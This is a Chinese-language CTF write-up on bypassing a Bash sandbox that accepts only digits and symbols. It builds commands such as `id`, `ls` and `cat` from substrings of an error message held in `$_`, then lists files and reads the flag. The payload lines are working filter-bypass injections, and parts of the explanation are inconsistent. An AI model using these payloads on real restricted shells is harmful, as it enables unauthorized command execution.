## Bash 错误 RCE（仅支持数字+符号）

常规输入命令无效

![](https://pic1.imgdb.cn/item/68a2a49258cb8da5c82cb283.png)

执行无字母命令并故意构造错误

```sh
$-
```

![](https://pic1.imgdb.cn/item/68a2c0f558cb8da5c82d8402.png)

我们可以使用 `$_ `变量来访问最后运行的命令。因此，要运行 `id`，我们执行以下操作：

```sh
"$($- 2>&1)"; ${_:7:1}${_:20:1};
```

1️⃣ 第一个部分：`"$($- 2>&1)"`

`$()`：命令替换，把括号里的命令执行结果作为字符串返回

`$-`：

- `$-` 是 **Bash 内置变量**，表示当前 shell 的 **选项标志**
- 输出通常是类似 `himBH` 这样的字符串（表示 shell 开启了哪些选项）

`2>&1`：把标准错误（stderr）重定向到标准输出（stdout）

- 这里 `$-` 是有效变量，不会报错，所以实际上 `2>&1` 没有作用

2️⃣ 第二个部分：`${_:7:1}${_:20:1}`

1. **`${VAR:start:length}`** 是 Bash **子串提取**语法：
   - `VAR` 是变量名
   - `start` 是起始索引（0 开始）
   - `length` 是长度
2. **`_`** 变量：
   - 在 SansAlpha 中，通常会用 `_="$($- 2>&1)"` 将错误输出存到 `_` 里
   - 例如 `_="bash: himBH: command not found"`
3. **`${_:7:1}`**：提取第 8 个字符（索引从 0 开始），在上面的例子里是 `h`
4. **`${_:20:1}`**：提取第 21 个字符，在上面的例子里可能是 `c`
5. **组合**：`${_:7:1}${_:20:1}` → 拼接得到 `id` 或者题目中需要的其他字符

![](https://pic1.imgdb.cn/item/68a2c17f58cb8da5c82d8a67.png)

由此，我们得到 `ls`

```sh
"$($- 2>&1)"; "$(${_:7:1}${_:20:1})"; ${_:14:1}${_:47:1}
```

![](https://pic1.imgdb.cn/item/68a2c1ec58cb8da5c82d9078.png)

由此，我们得到 `cat` 和 `on-calastran.txt`

```sh
"$($- 2>&1)"; "$(${_:7:1}${_:20:1})"; "$(${_:14:1}${_:47:1})"; ${_:10:1}${_:11:1}${_:15:1} ${_:7:16}
```

![](https://pic1.imgdb.cn/item/68a2c2bc58cb8da5c82d9dd8.png)

查看 `blargh` 目录

```sh
"$($- 2>&1)"; "$(${_:7:1}${_:20:1})"; "$(${_:14:1}${_:47:1})"; "$(${_:10:1}${_:11:1}${_:15:1} ${_:7:16})"; ${_:6:1}${_:8:1} ${_:59:1}${_:6:1}${_:5:1}${_:10:1}${_:262:1}${_:1:1}
```

最后拿到 flag

```sh
"$($- 2>&1)"; "$(${_:7:1}${_:20:1})"; "$(${_:14:1}${_:47:1})"; "$(${_:10:1}${_:11:1}${_:15:1} ${_:7:16})"; ${_:30:1}${_:5:1}${_:9:1} ${_:59:1}${_:6:1}${_:5:1}${_:10:1}${_:262:1}${_:1:1}/${_:62:1}${_:6:1}${_:5:1}${_:262:1}.${_:9:1}${_:36:1}${_:9:1}
```

![](https://pic1.imgdb.cn/item/68a2c35d58cb8da5c82da786.png)
